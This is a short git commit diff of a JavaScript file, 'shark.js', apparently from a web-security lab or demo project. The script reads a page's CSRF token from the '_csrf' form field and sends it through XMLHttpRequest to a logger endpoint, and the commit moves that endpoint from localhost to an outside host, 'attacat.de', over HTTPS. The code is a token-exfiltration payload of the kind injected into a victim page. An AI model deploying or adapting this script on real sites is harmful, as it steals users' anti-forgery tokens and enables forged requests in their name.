df97f47783f42a659db25d43a0b269ccc15d3a6a
Hannes Molsen <mail@hannesmolsen.de>
2019-12-09 18:19:43 +0100

    adapted csrf to https

--- webapps/surfer/shark.js
+++ webapps/surfer/shark.js
@@ -1,6 +1,6 @@
 setTimeout(function(){
 	var csrf_token = document.getElementsByName('_csrf')[0].value;
-    var url = "http://localhost:8666/logger/log.jsp?csrf=" + csrf_token;
+    var url = "https://attacat.de:8666/logger/log.jsp?csrf=" + csrf_token;
 	var xmlhttp;
 	if (window.XMLHttpRequest) {
 		xmlhttp=new XMLHttpRequest();
